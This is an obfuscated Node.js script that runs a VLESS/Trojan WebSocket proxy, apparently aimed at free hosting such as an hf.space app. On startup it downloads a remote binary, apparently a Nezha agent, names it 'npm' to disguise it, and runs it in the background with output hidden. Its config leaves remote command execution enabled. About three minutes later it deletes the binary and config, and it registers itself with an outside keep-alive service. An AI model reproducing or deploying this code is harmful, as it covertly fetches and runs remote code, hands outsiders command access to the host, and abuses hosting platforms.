const _0x500778=_0x16fd;(function(_0x958312,_0x580047){const _0x358c87=_0x16fd,_0x147b89=_0x958312();while(!![]){try{const _0x3c0c14=-parseInt(_0x358c87(0x166))/0x1+parseInt(_0x358c87(0x12e))/0x2+-parseInt(_0x358c87(0x131))/0x3+-parseInt(_0x358c87(0x13b))/0x4*(-parseInt(_0x358c87(0x14e))/0x5)+parseInt(_0x358c87(0x15a))/0x6+-parseInt(_0x358c87(0x190))/0x7*(parseInt(_0x358c87(0x199))/0x8)+parseInt(_0x358c87(0x17c))/0x9*(parseInt(_0x358c87(0x15d))/0xa);if(_0x3c0c14===_0x580047)break;else _0x147b89['push'](_0x147b89['shift']());}catch(_0xd96ce2){_0x147b89['push'](_0x147b89['shift']());}}}(_0x5603,0xb6fae));const os=require('os'),http=require(_0x500778(0x186)),fs=require('fs'),axios=require(_0x500778(0x141)),net=require('net'),path=require('path'),crypto=require(_0x500778(0x130)),{Buffer}=require(_0x500778(0x134)),{exec,execSync}=require(_0x500778(0x136)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env'][_0x500778(0x14c)]||_0x500778(0x13d),NEZHA_SERVER=process[_0x500778(0x13c)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x500778(0x13c)][_0x500778(0x18a)]||'',NEZHA_KEY=process[_0x500778(0x13c)]['NEZHA_KEY']||'',DOMAIN=process[_0x500778(0x13c)][_0x500778(0x156)]||'upperson-uppersonv.hf.space',AUTO_ACCESS=process[_0x500778(0x13c)][_0x500778(0x123)]||![],WSPATH=process['env'][_0x500778(0x172)]||UUID['slice'](0x0,0x8),SUB_PATH=process[_0x500778(0x13c)]['SUB_PATH']||'token',NAME=process[_0x500778(0x13c)][_0x500778(0x12b)]||'',PORT=process[_0x500778(0x13c)][_0x500778(0x122)]||0xbb8;let ISP='';const GetISP=async()=>{const _0x249318=_0x500778;try{const _0x39a0a0=await axios['get'](_0x249318(0x12c)),_0x3854fe=_0x39a0a0[_0x249318(0x184)];ISP=(_0x3854fe['country_code']+'-'+_0x3854fe[_0x249318(0x16c)])[_0x249318(0x140)](/ /g,'_');}catch(_0x20076c){ISP=_0x249318(0x182);}};GetISP();const httpServer=http[_0x500778(0x189)]((_0xf9736e,_0x4883f5)=>{const _0xa0208b=_0x500778;if(_0xf9736e['url']==='/'){const _0x417d26=path[_0xa0208b(0x14d)](__dirname,_0xa0208b(0x12d));fs['readFile'](_0x417d26,'utf8',(_0x2583f2,_0x2d6a23)=>{const _0x41659b=_0xa0208b;if(_0x2583f2){_0x4883f5[_0x41659b(0x17e)](0xc8,{'Content-Type':_0x41659b(0x188)}),_0x4883f5[_0x41659b(0x197)](_0x41659b(0x16f));return;}_0x4883f5[_0x41659b(0x17e)](0xc8,{'Content-Type':_0x41659b(0x188)}),_0x4883f5[_0x41659b(0x197)](_0x2d6a23);});return;}else{if(_0xf9736e['url']==='/'+SUB_PATH){const _0x3df9cd=NAME?NAME+'-'+ISP:ISP,_0x6d5df1=_0xa0208b(0x15b)+UUID+_0xa0208b(0x177)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0xa0208b(0x151)+WSPATH+'#'+_0x3df9cd,_0x305297=_0xa0208b(0x15f)+UUID+_0xa0208b(0x183)+DOMAIN+_0xa0208b(0x175)+DOMAIN+'&path=%2F'+WSPATH+'#'+_0x3df9cd,_0x5135c2=_0x6d5df1+'\x0a'+_0x305297,_0x265f0d=Buffer['from'](_0x5135c2)[_0xa0208b(0x18f)](_0xa0208b(0x144));_0x4883f5['writeHead'](0xc8,{'Content-Type':_0xa0208b(0x143)}),_0x4883f5[_0xa0208b(0x197)](_0x265f0d+'\x0a');}else _0x4883f5['writeHead'](0x194,{'Content-Type':'text/plain'}),_0x4883f5[_0xa0208b(0x197)](_0xa0208b(0x170));}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID[_0x500778(0x140)](/-/g,''),DNS_SERVERS=[_0x500778(0x128),'1.1.1.1'];function _0x5603(){const _0x3418c7=['hex','\x20-p\x20','close','trim','npm','end','slice','1024fEjziQ','length','concat','catch','every','post','PORT','AUTO_ACCESS','true','map','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','Automatic\x20Access\x20Task\x20added\x20successfully','8.8.4.4','2087','config.yaml','NAME','https://api.ip.sb/geoip','index.html','464166NUepSH','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','crypto','2763474nlQVMn','https://arm64.ssss.nyc.mn/v1','arm','buffer','application/dns-json','child_process','pop','sha224','unlink','send','833268cuAZpn','env','f089af11-462e-4d46-9aae-d173f00910ff','8443','reduce','replace','axios','writeFileSync','text/plain','base64','error','443','Status','arch','log','arm64','listen','UUID','join','5fuLJfS','npm\x20is\x20running','https://oooo.serv00.net/add-url','&path=%2F','https://amd64.ssss.nyc.mn/agent','createWriteStream','false','decode','DOMAIN','substr','write','url','7470582xabKVh','vless://','then','290DImqHt','\x20with\x20all\x20DNS\x20servers','trojan://','2053','test','includes','find','type','application/json','778114KPZvet','message','https://dns.google/resolve?name=','Failed\x20to\x20resolve\x20','pipe','npm\x20running\x20error:','isp','aarch64','--tls','Hello\x20world!','Not\x20Found\x0a','2083','WSPATH','https://arm64.ssss.nyc.mn/agent','npm\x20download\x20successfully','&fp=chrome&type=ws&host=','npm\x20is\x20already\x20running,\x20skip\x20running...','@cdns.doon.eu.org:443?encryption=none&security=tls&sni=','Server\x20is\x20running\x20on\x20port\x20','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','connect','client_secret:\x20','523881vUSuoI','utf-8','writeHead','connection','readUInt8','https://','Unknown','@cdns.doon.eu.org:443?security=tls&sni=','data','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','http','readUInt16BE','text/html','createServer','NEZHA_PORT','Answer','once','finish','&type=A','toString','50575ZOIJXu','createHash'];_0x5603=function(){return _0x3418c7;};return _0x5603();}function resolveHost(_0x26024e){return new Promise((_0x5b2891,_0x1e83dd)=>{const _0x281d91=_0x16fd;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x281d91(0x161)](_0x26024e)){_0x5b2891(_0x26024e);return;}let _0x12b930=0x0;function _0x28ba04(){const _0x2ab1f9=_0x281d91;if(_0x12b930>=DNS_SERVERS[_0x2ab1f9(0x19a)]){_0x1e83dd(new Error(_0x2ab1f9(0x169)+_0x26024e+_0x2ab1f9(0x15e)));return;}const _0xd90dcf=DNS_SERVERS[_0x12b930];_0x12b930++;const _0xdc8a0d=_0x2ab1f9(0x168)+encodeURIComponent(_0x26024e)+_0x2ab1f9(0x18e);axios['get'](_0xdc8a0d,{'timeout':0x1388,'headers':{'Accept':_0x2ab1f9(0x135)}})[_0x2ab1f9(0x15c)](_0x9d5f08=>{const _0x4bc388=_0x2ab1f9,_0x2b1028=_0x9d5f08[_0x4bc388(0x184)];if(_0x2b1028[_0x4bc388(0x147)]===0x0&&_0x2b1028['Answer']&&_0x2b1028[_0x4bc388(0x18b)][_0x4bc388(0x19a)]>0x0){const _0x27680f=_0x2b1028[_0x4bc388(0x18b)][_0x4bc388(0x163)](_0x388c73=>_0x388c73[_0x4bc388(0x164)]===0x1);if(_0x27680f){_0x5b2891(_0x27680f['data']);return;}}_0x28ba04();})[_0x2ab1f9(0x11f)](_0x82dbb3=>{_0x28ba04();});}_0x28ba04();});}function handleVlessConnection(_0x313b06,_0x480dcb){const _0x1c0bde=_0x500778,[_0x2be4b0]=_0x480dcb,_0x55c605=_0x480dcb[_0x1c0bde(0x198)](0x1,0x11);if(!_0x55c605['every']((_0x2dc551,_0x2d2c23)=>_0x2dc551==parseInt(uuid[_0x1c0bde(0x157)](_0x2d2c23*0x2,0x2),0x10)))return![];let _0x28cb63=_0x480dcb['slice'](0x11,0x12)[_0x1c0bde(0x180)]()+0x13;const _0x3823c5=_0x480dcb['slice'](_0x28cb63,_0x28cb63+=0x2)['readUInt16BE'](0x0),_0x1fba19=_0x480dcb['slice'](_0x28cb63,_0x28cb63+=0x1)[_0x1c0bde(0x180)](),_0x3c4893=_0x1fba19==0x1?_0x480dcb['slice'](_0x28cb63,_0x28cb63+=0x4)[_0x1c0bde(0x14d)]('.'):_0x1fba19==0x2?new TextDecoder()[_0x1c0bde(0x155)](_0x480dcb['slice'](_0x28cb63+0x1,_0x28cb63+=0x1+_0x480dcb['slice'](_0x28cb63,_0x28cb63+0x1)[_0x1c0bde(0x180)]())):_0x1fba19==0x3?_0x480dcb[_0x1c0bde(0x198)](_0x28cb63,_0x28cb63+=0x10)['reduce']((_0x260f86,_0x59195e,_0x47123b,_0x24ffdc)=>_0x47123b%0x2?_0x260f86[_0x1c0bde(0x19b)](_0x24ffdc[_0x1c0bde(0x198)](_0x47123b-0x1,_0x47123b+0x1)):_0x260f86,[])[_0x1c0bde(0x125)](_0x3f2d8e=>_0x3f2d8e[_0x1c0bde(0x187)](0x0)[_0x1c0bde(0x18f)](0x10))[_0x1c0bde(0x14d)](':'):'';_0x313b06[_0x1c0bde(0x13a)](new Uint8Array([_0x2be4b0,0x0]));const _0x282bb5=createWebSocketStream(_0x313b06);return resolveHost(_0x3c4893)['then'](_0x167ca9=>{const _0x3390c9=_0x1c0bde;net[_0x3390c9(0x17a)]({'host':_0x167ca9,'port':_0x3823c5},function(){const _0x1a11da=_0x3390c9;this[_0x1a11da(0x158)](_0x480dcb[_0x1a11da(0x198)](_0x28cb63)),_0x282bb5['on'](_0x1a11da(0x145),()=>{})[_0x1a11da(0x16a)](this)['on'](_0x1a11da(0x145),()=>{})['pipe'](_0x282bb5);})['on']('error',()=>{});})['catch'](_0xfe770b=>{const _0xd431d7=_0x1c0bde;net[_0xd431d7(0x17a)]({'host':_0x3c4893,'port':_0x3823c5},function(){const _0x4fbfa6=_0xd431d7;this[_0x4fbfa6(0x158)](_0x480dcb['slice'](_0x28cb63)),_0x282bb5['on'](_0x4fbfa6(0x145),()=>{})[_0x4fbfa6(0x16a)](this)['on'](_0x4fbfa6(0x145),()=>{})['pipe'](_0x282bb5);})['on'](_0xd431d7(0x145),()=>{});}),!![];}function handleTrojanConnection(_0x34de40,_0x5eb34f){const _0x12dc20=_0x500778;try{if(_0x5eb34f[_0x12dc20(0x19a)]<0x3a)return![];const _0x448a00=_0x5eb34f[_0x12dc20(0x198)](0x0,0x38)[_0x12dc20(0x18f)](),_0x1a21ef=[UUID];let _0x20288d=null;for(const _0x3fd7f2 of _0x1a21ef){const _0x4c8064=crypto[_0x12dc20(0x191)](_0x12dc20(0x138))['update'](_0x3fd7f2)['digest'](_0x12dc20(0x192));if(_0x4c8064===_0x448a00){_0x20288d=_0x3fd7f2;break;}}if(!_0x20288d)return![];let _0x4fd115=0x38;_0x5eb34f[_0x4fd115]===0xd&&_0x5eb34f[_0x4fd115+0x1]===0xa&&(_0x4fd115+=0x2);const _0x593c32=_0x5eb34f[_0x4fd115];if(_0x593c32!==0x1)return![];_0x4fd115+=0x1;const _0x4bfb4b=_0x5eb34f[_0x4fd115];_0x4fd115+=0x1;let _0x90ebb1,_0x2130ab;if(_0x4bfb4b===0x1)_0x90ebb1=_0x5eb34f[_0x12dc20(0x198)](_0x4fd115,_0x4fd115+0x4)[_0x12dc20(0x14d)]('.'),_0x4fd115+=0x4;else{if(_0x4bfb4b===0x3){const _0x472a93=_0x5eb34f[_0x4fd115];_0x4fd115+=0x1,_0x90ebb1=_0x5eb34f[_0x12dc20(0x198)](_0x4fd115,_0x4fd115+_0x472a93)[_0x12dc20(0x18f)](),_0x4fd115+=_0x472a93;}else{if(_0x4bfb4b===0x4)_0x90ebb1=_0x5eb34f[_0x12dc20(0x198)](_0x4fd115,_0x4fd115+0x10)[_0x12dc20(0x13f)]((_0x415abf,_0x12b9ee,_0xa4a0f8,_0x2a12bd)=>_0xa4a0f8%0x2?_0x415abf[_0x12dc20(0x19b)](_0x2a12bd[_0x12dc20(0x198)](_0xa4a0f8-0x1,_0xa4a0f8+0x1)):_0x415abf,[])[_0x12dc20(0x125)](_0x37f798=>_0x37f798[_0x12dc20(0x187)](0x0)[_0x12dc20(0x18f)](0x10))[_0x12dc20(0x14d)](':'),_0x4fd115+=0x10;else return![];}}_0x2130ab=_0x5eb34f[_0x12dc20(0x187)](_0x4fd115),_0x4fd115+=0x2;_0x4fd115<_0x5eb34f[_0x12dc20(0x19a)]&&_0x5eb34f[_0x4fd115]===0xd&&_0x5eb34f[_0x4fd115+0x1]===0xa&&(_0x4fd115+=0x2);const _0x1faa2d=createWebSocketStream(_0x34de40);return resolveHost(_0x90ebb1)[_0x12dc20(0x15c)](_0x36fb23=>{const _0x10a390=_0x12dc20;net[_0x10a390(0x17a)]({'host':_0x36fb23,'port':_0x2130ab},function(){const _0x17a146=_0x10a390;_0x4fd115<_0x5eb34f[_0x17a146(0x19a)]&&this[_0x17a146(0x158)](_0x5eb34f[_0x17a146(0x198)](_0x4fd115)),_0x1faa2d['on'](_0x17a146(0x145),()=>{})[_0x17a146(0x16a)](this)['on'](_0x17a146(0x145),()=>{})['pipe'](_0x1faa2d);})['on'](_0x10a390(0x145),()=>{});})[_0x12dc20(0x11f)](_0x4e3a2f=>{const _0x22ca09=_0x12dc20;net[_0x22ca09(0x17a)]({'host':_0x90ebb1,'port':_0x2130ab},function(){const _0x225b4d=_0x22ca09;_0x4fd115<_0x5eb34f[_0x225b4d(0x19a)]&&this[_0x225b4d(0x158)](_0x5eb34f['slice'](_0x4fd115)),_0x1faa2d['on']('error',()=>{})[_0x225b4d(0x16a)](this)['on'](_0x225b4d(0x145),()=>{})[_0x225b4d(0x16a)](_0x1faa2d);})['on'](_0x22ca09(0x145),()=>{});}),!![];}catch(_0x17390e){return![];}}wss['on'](_0x500778(0x17f),(_0x19fb7b,_0x4347c0)=>{const _0x505880=_0x500778,_0x3e3279=_0x4347c0[_0x505880(0x159)]||'';_0x19fb7b[_0x505880(0x18c)](_0x505880(0x167),_0x20f936=>{const _0x41e81c=_0x505880;if(_0x20f936[_0x41e81c(0x19a)]>0x11&&_0x20f936[0x0]===0x0){const _0xf3bba4=_0x20f936[_0x41e81c(0x198)](0x1,0x11),_0x5ebff8=_0xf3bba4[_0x41e81c(0x120)]((_0x3e3af9,_0x40bb1d)=>_0x3e3af9==parseInt(uuid[_0x41e81c(0x157)](_0x40bb1d*0x2,0x2),0x10));if(_0x5ebff8){!handleVlessConnection(_0x19fb7b,_0x20f936)&&_0x19fb7b[_0x41e81c(0x194)]();return;}}!handleTrojanConnection(_0x19fb7b,_0x20f936)&&_0x19fb7b[_0x41e81c(0x194)]();})['on'](_0x505880(0x145),()=>{});});const getDownloadUrl=()=>{const _0x197c82=_0x500778,_0x2d1569=os[_0x197c82(0x148)]();return _0x2d1569===_0x197c82(0x133)||_0x2d1569===_0x197c82(0x14a)||_0x2d1569===_0x197c82(0x16d)?!NEZHA_PORT?_0x197c82(0x132):_0x197c82(0x173):!NEZHA_PORT?'https://amd64.ssss.nyc.mn/v1':_0x197c82(0x152);},downloadFile=async()=>{const _0x4e4676=_0x500778;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x1a9405=getDownloadUrl(),_0x295ea4=await axios({'method':'get','url':_0x1a9405,'responseType':'stream'}),_0x11ba67=fs[_0x4e4676(0x153)]('npm');return _0x295ea4['data']['pipe'](_0x11ba67),new Promise((_0x389a76,_0x3d7f36)=>{const _0x157f35=_0x4e4676;_0x11ba67['on'](_0x157f35(0x18d),()=>{const _0x61264a=_0x157f35;console[_0x61264a(0x149)](_0x61264a(0x174)),exec('chmod\x20+x\x20npm',_0x2b88ac=>{if(_0x2b88ac)_0x3d7f36(_0x2b88ac);_0x389a76();});}),_0x11ba67['on']('error',_0x3d7f36);});}catch(_0x1b7491){throw _0x1b7491;}},runnz=async()=>{const _0x219ce2=_0x500778;try{const _0x1953e5=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':_0x219ce2(0x17d)});if(_0x1953e5[_0x219ce2(0x195)]()!==''){console[_0x219ce2(0x149)](_0x219ce2(0x176));return;}}catch(_0x1697ae){}await downloadFile();let _0x170f30='',_0x1f6034=[_0x219ce2(0x146),_0x219ce2(0x13e),'2096',_0x219ce2(0x129),_0x219ce2(0x171),_0x219ce2(0x160)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x2931f7=_0x1f6034[_0x219ce2(0x162)](NEZHA_PORT)?_0x219ce2(0x16e):'';_0x170f30='setsid\x20nohup\x20./npm\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x219ce2(0x193)+NEZHA_KEY+'\x20'+_0x2931f7+_0x219ce2(0x12f);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x3281cf=NEZHA_SERVER[_0x219ce2(0x162)](':')?NEZHA_SERVER['split'](':')[_0x219ce2(0x137)]():'',_0x42e301=_0x1f6034[_0x219ce2(0x162)](_0x3281cf)?_0x219ce2(0x124):_0x219ce2(0x154),_0x4389d3=_0x219ce2(0x17b)+NEZHA_KEY+_0x219ce2(0x126)+NEZHA_SERVER+_0x219ce2(0x185)+_0x42e301+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x219ce2(0x142)](_0x219ce2(0x12a),_0x4389d3);}_0x170f30='setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else{console['log'](_0x219ce2(0x179));return;}}try{exec(_0x170f30,{'shell':'/bin/bash'},_0xb600b4=>{const _0x5eefa3=_0x219ce2;if(_0xb600b4)console[_0x5eefa3(0x145)](_0x5eefa3(0x16b),_0xb600b4);else console[_0x5eefa3(0x149)](_0x5eefa3(0x14f));});}catch(_0xa8ae76){console[_0x219ce2(0x145)]('error:\x20'+_0xa8ae76);}};async function addAccessTask(){const _0x20742d=_0x500778;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x115126=_0x20742d(0x181)+DOMAIN+'/'+SUB_PATH;try{const _0x516619=await axios[_0x20742d(0x121)](_0x20742d(0x150),{'url':_0x115126},{'headers':{'Content-Type':_0x20742d(0x165)}});console[_0x20742d(0x149)](_0x20742d(0x127));}catch(_0x36814b){}}const delFiles=()=>{const _0x235157=_0x500778;fs['unlink'](_0x235157(0x196),()=>{}),fs[_0x235157(0x139)](_0x235157(0x12a),()=>{});};function _0x16fd(_0x243b48,_0x293ed3){_0x243b48=_0x243b48-0x11f;const _0x560392=_0x5603();let _0x16fd0c=_0x560392[_0x243b48];return _0x16fd0c;}httpServer[_0x500778(0x14b)](PORT,()=>{const _0x33e79e=_0x500778;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x33e79e(0x149)](_0x33e79e(0x178)+PORT);});
